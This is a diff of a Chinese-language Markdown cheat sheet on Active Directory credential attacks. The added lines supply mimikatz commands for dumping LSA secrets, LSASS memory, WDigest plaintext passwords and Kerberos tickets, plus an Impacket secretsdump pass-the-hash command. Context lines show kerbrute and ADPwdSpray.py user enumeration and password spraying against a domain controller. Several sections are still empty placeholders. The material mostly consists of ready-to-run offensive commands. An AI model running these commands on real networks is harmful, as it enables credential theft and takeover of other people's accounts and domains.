@@ -9,11 +9,11 @@ description: 枚举用户名 + 密码喷洒 = 获取有效凭证 / 枚举出用�
 * 已经在目标域中建立了基本的立足点
 * 有足够权限利用域内的查询命令 / 工具
 
-## 获取明文身份凭证
+## Windows凭证转储
 
 ### LAS Secrets
 
-*
+* 从Windows注册表中获取NTLM哈希、明文密码、Kerberos 票据：
 
 ```powershell
 # 使用mimikatz提取
@@ -28,7 +28,8 @@ lsadump::secrets
 ```
 
 ```bash
-# shiyo
+# 使用Impacket工具中的secretsdump.py脚本
+python3 secretsdump.py administrator@192.168.xxx.xxx -hashes 00000000000000000000000000000000:123CDVEE.....NDFE6654GDS
 ```
 
 ### LSASS进程
@@ -48,37 +49,57 @@ sekurlsa::tickets
 crackmapexec smb 192.168.xxx.xxx -u 用户名 -p 密码 --lsa
 ```
 
-### LSASS Protection bypass
+### 绕过LSASS进程保护
 
+* 是访问LSASS进程，并从中获取NTLM哈希、明文密码、Kerberos 票据：
 
+```bash
+# 使用mimikatz提取
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+# 从DMP文件中提取凭证
+sekurlsa::minidump lsass.DMP
+sekurlsa::tickets
+```
 
+### 凭证管理
 
+* 从凭证管理中获取NTLM哈希、明文密码、Kerberos 票据：
 
-
-
-### Credential Manager
-
-
-
-
+```bash
+# 使用mimikatz获取
+mimikatz.exe
+privilege::debug 
+sekurlsa::logonpasswords
+# 当目标启用了wdigest身份验证或存储了明文密码时 
+sekurlsa::wdigest
+sekurlsa::tickets
+```
 
 ## 获取Hash身份凭证
 
 ### 通过SAM数据库获取本地用户Hash凭证
 
+*
 
-
-
+```
+// Some code
+```
 
 ### 通过域控的ntds.dit文件
 
 #### 本地提取
 
-
+```
+// Some code
+```
 
 #### 远程提取
 
-
+```
+// Some code
+```
 
 ## 用户名枚举工具&使用
 
@@ -97,9 +118,9 @@ kerbrute userenum -d 目标域名 usernames.txt -dc-ip 域控IP
 * 用的是：**EnumADUser.py**
 
 ```bash
-// TCP模式
+# TCP模式
 python EnumADUser.py 域控IP 目标域名 username.txt tcp
-// UDP模式
+# UDP模式
 python EnumADUser.py 域控IP 目标域名 username.txt udp
 ```
 
@@ -130,10 +151,10 @@ kerbrute passwordspray -d 目标域名 -p 已知的密码 usernames.txt -dc-ip �
 * 用的是：**ADPwdSpray.py**
 
 ```bash
-// 针对明文密码进行喷洒（TCP和UDP模式）
+# 针对明文密码进行喷洒（TCP和UDP模式）
 python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 tcp
 python ADPwdSpray.py 域控IP 目标域名 username.txt clearpassword 已知明文密码 udp
-// 针对密码Hash进行喷洒（TCP和UDP模式）
+# 针对密码Hash进行喷洒（TCP和UDP模式）
 python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 tcp
 python ADPwdSpray.py 域控IP 目标域名 username.txt ntlmhash 已获取的密码哈希 udp
 ```
